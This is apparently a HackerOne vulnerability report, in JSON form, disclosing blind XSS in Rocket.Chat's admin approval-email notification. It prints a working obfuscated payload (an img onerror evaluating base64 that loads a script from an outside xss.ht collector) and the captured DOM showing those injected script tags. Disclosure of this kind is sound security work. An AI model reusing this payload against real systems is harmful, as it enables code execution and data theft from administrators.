    "vulnerability_information": "*Note: This report was initially sent via email and I was invited to submit this here.*\n\nHi team,\n\nDuring an audit on a third-party, I discovered that rocket.chat Android client might be vulnerable to blind XSS. My XSS payload fired in the context of the target's rocket.chat client as you can see below \u2014 details concerning the target have been redacted.\n\nUnfortunately, I did not take note of where exactly I submitted the payloads, but based on the canvas rendering of the page the payload fired in, I believe that the `Accounts_Admin_Email_Approval_Needed_With_Reason_Default` action is vulnerable.\n\n{F321540}  \n\nThe results were quite surprising though. The payload apparently fired in the context of `email://4/71676`. This the DOM of the vulnerable page:\n\n```html\n<html><head>\n        <meta id=\"meta-viewport\" name=\"viewport\" content=\"width=412\" contenteditable=\"false\">\n        <style>\n            .mail-message-content pre {\n                white-space: pre-wrap !important;\n            }\n\n            .initial-load {\n                /* 0x0 and 1x1 may be short-circuited by WebView */\n                width: 2px;\n                height: 0px;\n                -webkit-transform: translate3d(0, 0, 1px);\n                -webkit-animation-name: initial-load-noop-animation;\n                -webkit-animation-duration: 1ms; /* doesn't matter */\n            }\n\n            /* Animating the z-position is fast and does not actually change anything in the default\n            * perspective.\n            */\n            @-webkit-keyframes initial-load-noop-animation {\n                from {\n                    -webkit-transform: translate3d(0, 0, 1px);\n                }\n                to {\n                    -webkit-transform: translate3d(0, 0, 0);\n                }\n            }\n        </style>\n    <title></title></head>\n    <body id=\"MessageViewBody\" style=\"margin: 0px 26.5px; padding: 0px !important; word-break: keep-all !important; word-wrap: break-word !important; width: 360px;\" onpageshow=\"\">\n        <div id=\"MessageWebViewDiv\" class=\"mail-message-content collapsible zoom-normal\" style=\"user-select: auto; display: block; height: auto; padding-bottom: 5px; width: 360px;\" set_width_attr=\"1\">\n            <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" width=\"100%\" bgcolor=\"#f3f3f3\" style=\"color:#4a4a4a;font-family: Helvetica,Arial,sans-serif;font-size:14px;line-height:20px;border-collapse:collapse;border-spacing:0;margin:0 auto\" original_width_attr=\"-1\"><tbody><tr><td style=\"padding:1em\"><table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" width=\"100%\" style=\"width:100%;margin:0 auto;max-width:800px\"><tbody><tr><td bgcolor=\"#ffffff\" style=\"background-color:#ffffff; border: 1px solid #DDD; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;\"><table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"><tbody><tr><td style=\"background-color: #04436a;\"><h1 style=\"font-family: Helvetica,Arial,sans-serif; padding: 0 1em; margin: 0; line-height: 70px; color: #FFF;\">Rocket.Chat</h1></td></tr><tr><td style=\"padding: 1em; font-size: 10pt; font-family: Helvetica,Arial,sans-serif;\"><p>The user <b>abba (<a href=\"mailto:hackeroned@protonmail.com\">xxxxxxx@xxxxxxx.com</a>)</b> has been registered.</p><p>Reason: <b>\"&gt;<img src=\"x\" id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMjk3Mzk1NjMzOC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\" onerror=\"eval(atob(this.id))\"></b></p><p>Please check \"Administration -&gt; Users\" to activate or delete it.</p></td></tr></tbody></table></td></tr><tr><td border=\"0\" cellspacing=\"0\" cellpadding=\"0\" width=\"100%\" style=\"font-family: Helvetica,Arial,sans-serif; max-width: 800px; margin: 0 auto; padding: 1.5em; text-align: center; font-size: 8pt; color: #999;\">Powered by <a href=\"https://rocket.chat\" target=\"_blank\">Rocket.Chat</a></td></tr></tbody></table></td></tr></tbody></table>\n\n        </div>\n    <!-- delete the annotation. -->\n    \n    <script type=\"text/javascript\">\n        var IS_RTL = 'false';\n        var MSG_HIDE_ELIDED = 'VORHERIGE NACHRICHTEN AUSBLENDEN';\n        var MSG_SHOW_ELIDED = 'VORHERIGE NACHRICHTEN ANZEIGEN';\n        var DOC_BASE_URI = 'email://71676';\n        var WIDE_VIEWPORT_WIDTH = 1440;\n        var WEBVIEW_WIDTH = 1440;\n        var ENABLE_CONTENT_READY = true;\n        var BASE_FONT_SIZE = 3;\n        var IS_AUTOFIT = true;\n        var CONTENT_WIDTH = 0;\n        var DENSITY_RATIO = 1.0;\n        var CHANGE_VIEWPORT_WIDTH = false;\n        var IS_CONVERSATION_VIEW_MODE = false;\n        var IS_LARGE_SCALE = 1;\n        var USE_SELECTION_CHANGE = false;\n        var USE_WORD_WRAPPING = false;\n\t\tvar IS_DESKTOP_MODE = false;\n\t\tvar IMAGE_MENTION = 'an image is included.';\n        var TABLE_MENTION = 'a table is included.';\n        var IS_PART_MESSAGE = false;\n    </script>\n    <script type=\"text/javascript\" src=\"file:///android_asset/messageview/AutoFit.js\"></script>\n    <script type=\"text/javascript\" src=\"file:///android_asset/messageview/Selection.js\"></script>\n    <script type=\"text/javascript\" src=\"file:///android_asset/messageview/ContentsParser.js\"></script>\n    <script type=\"text/javascript\" src=\"file:///android_asset/messageview/Controller.js\"></script>\n    <script type=\"text/javascript\" src=\"file:///android_asset/messageview/layout.js\"></script>\n    <script type=\"text/javascript\" src=\"file:///android_asset/messageview/exec.js\"></script><div id=\"initial-load-signal\" class=\"initial-load\" style=\"user-select: none;\"></div>\n\n<script src=\"https://2973956338.xss.ht\"></script><script src=\"https://2973956338.xss.ht\"></script><script src=\"https://2973956338.xss.ht\"></script><iframe width=\"412\" height=\"330\" scrolling=\"no\" style=\"visibility: hidden; position: absolute; top: -10000px; left: -10000px;\"></iframe><iframe width=\"412\" height=\"330\" scrolling=\"no\" style=\"visibility: hidden; position: absolute; top: -10000px; left: -10000px;\"></iframe></body></html>\n```\n\nI am confident this is as a result of your code and not the target's implementation. Please do let me know though if this has something to do with the version that the target is currently running \u2014 they might be running an outdated instance of rocket.chat.\n\n\\- Ed\n\n## Impact\n\nAn attacker can execute malicious client-side code against the target's administrator. I was able to retrieve the contents of the DOM from the administrator's notification window.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://rocket.chat", 
            "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors.", 
            "twitter_handle": "RocketChat", 
            "name": "Rocket.Chat"
        }, 
        "handle": "rocket_chat", 
        "url": "https://hackerone.com/rocket_chat", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/019/858/8d9ef2fed6eede0f68fb07436444b90a733f675e_small.png?1536335889", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/019/858/579770f2ba92af3953abc9204886c242051f03e3_medium.png?1536335889"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 19858, 
        "default_currency": "usd"
    }, 
    "is_published": false
}